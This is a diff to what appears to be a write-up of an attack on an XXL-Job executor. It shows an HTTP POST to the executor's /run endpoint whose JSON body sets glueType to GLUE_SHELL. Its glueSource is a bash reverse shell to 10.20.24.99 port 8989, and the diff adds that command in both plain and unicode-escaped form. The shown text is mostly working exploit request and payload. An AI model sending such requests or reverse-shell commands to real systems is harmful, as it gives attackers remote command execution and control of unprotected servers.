@@ -414,6 +414,10 @@ User-Agent: Java/1.8.0_60
 9   0.037061    10.88.105.53    10.20.24.99 HTTP    180 HTTP/1.1 200 OK  (text/html)
 ```
 
+
+`bash -i \u003e\u0026 /dev/tcp/10.20.24.99/8989 0\u003e\u00261\n`
+`bash -i >& /dev/tcp/10.20.24.99/8989 0>&1\n`
+
 ```
 POST /run HTTP/1.1
 Content-Type: application/json;charset=UTF-8
@@ -426,20 +430,23 @@ Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
 Connection: keep-alive
 Content-Length: 326
 
+
 {
-  "jobId": 2,
+  "jobId": 5,
   "executorHandler": "",
   "executorParams": "",
   "executorBlockStrategy": "SERIAL_EXECUTION",
   "executorTimeout": 0,
-  "logId": 14,
-  "logDateTime": 1603865786404,
+  "logId": 13,
+  "logDateTime": 1603865778890,
   "glueType": "GLUE_SHELL",
-  "glueSource": "bash -i >& /dev/tcp/10.20.24.99/8989 0>&1\n",
+  "glueSource": "bash -i \u003e\u0026 /dev/tcp/10.20.24.99/8989 0\u003e\u00261\n",
   "glueUpdatetime": 1603860395000,
   "broadcastIndex": 0,
   "broadcastTotal": 1
 }
+
+
 
 HTTP/1.1 200 OK
 content-type: text/html;charset=UTF-8
